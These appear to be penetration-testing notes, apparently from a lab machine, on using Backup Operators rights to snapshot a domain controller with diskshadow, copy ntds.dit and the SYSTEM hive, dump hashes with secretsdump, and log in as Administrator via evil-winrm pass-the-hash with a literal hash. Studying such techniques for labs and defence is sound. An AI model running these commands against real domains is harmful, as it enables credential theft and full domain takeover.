- With `Backup Operators`, ==**we can backup the DC’s hard drive**, **make a copy of ntds.dit**== and the system registry hive from the backup, and then move both files offline and dump hashes.
- https://happycamper84.medium.com/securing-ad-backups-8804b31da9fd

# Exploitation
---
- `DiskShadow` can create **==shadow copies (snapshots) of volumes==**, which are used for various purposes like backups, restores, and testing.
- We can simply create a backup.txt for ==**`diskshadow`**== containing:
```
set verbose on 
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible 
set context persistent  
begin backup  
add volume C: alias cdrive 
create  
expose %cdrive% E: 
end backup
```
- `set verbose on`: Enable detailed output (good for debugging).
- `set metadata C:\Windows\Temp\meta.cab`: Save VSS metadata to a file (required for diskshadow).
- `set context clientaccessible`: Allows the backup to be accessed by users. 
- `set context persistent`:  Keep the shadow copy until manually deleted (good for longer operations).
- ==`begin backup`: Start backup definition==
- ==`add volume C`: Tell it to back up the C drive==
- ==`alias cdrive`: Name it cdrive for later use==
- ==`create`: Actually create the VSS snapshot==
- ==`expose %cdrive% E:`: Expose it as drive E:==
- ==`end backup`: Finish==

- Run the `diskshadow`script:
	- `diskshadow /s backup.txt`
	- ![[Pasted image 20250426050523.png]]
- ==`robocopy /b`== lets you ==**copy files even if you don't have normal permission**== to read them — as long as you have **backup privileges** (like if you're running as admin or SYSTEM).
	- It copies files **without changing timestamps** or **file ownership**.
- Use `robocopy`to copy the `ntds.dit`and `system` files
	- `robocopy /b E:\Windows\ntds . ntds.dit`
	- `reg save hklm\system .\system`
	- `download system`
	- `download ntds.dit`
		- ![[Pasted image 20250426050753.png]]
- Use `impacket-secretsdump`:
	- `impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL | grep Administrator`
	- ![[Pasted image 20250426051003.png]]
- `Evil-winrm`to login:
- `evil-winrm -i 10.10.10.192 -u Administrator -H '184fb5e5178480be64824d4cd53b99ee'`
- ![[Pasted image 20250426051125.png]]